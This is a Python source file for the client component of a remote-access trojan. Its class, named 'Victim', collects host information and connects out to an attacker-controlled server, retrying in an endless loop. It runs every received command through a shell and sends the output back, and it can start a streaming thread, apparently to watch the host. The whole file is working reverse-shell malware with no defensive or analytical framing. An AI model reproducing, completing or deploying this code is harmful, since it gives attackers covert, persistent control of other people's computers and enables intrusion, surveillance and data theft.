import socket, subprocess, os, time, json
from threading import Thread

from stream.stream import Stream
from info import get_host_info
from const import Const


class Victim:
    def __init__(self, info=None, sock=None) -> None:
        if info:
            self.info = info
        else:
            self.info = get_host_info()

        self.socket = sock

    def handle(self, command: str) -> str | None:
        if command == 'stream':
            stream = Stream()
            thread = Thread(target=stream.start)
            thread.start()
            return None

        elif command[:2] == 'cd':
            try:
                os.chdir(command[2:].strip())
                return ' '
            except (FileNotFoundError, OSError) as err:
                return str(err)

        else:
            return subprocess.getoutput(command, encoding=Const.ENCODING)

    def connect(self, srv_ip: str, srv_port: int) -> None:
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.connect((srv_ip, srv_port))
                self.socket.send(json.dumps(self.info).encode(encoding=Const.ENCODING))

                while True:
                    command = self.socket.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)

                    if not command:
                        break

                    output = self.handle(command.strip())

                    if not output:
                        continue

                    self.socket.send(output.encode(encoding=Const.ENCODING))

            except Exception:
                self.socket.close()
                time.sleep(Const.CONNECTION_TIMEOUT)
                continue
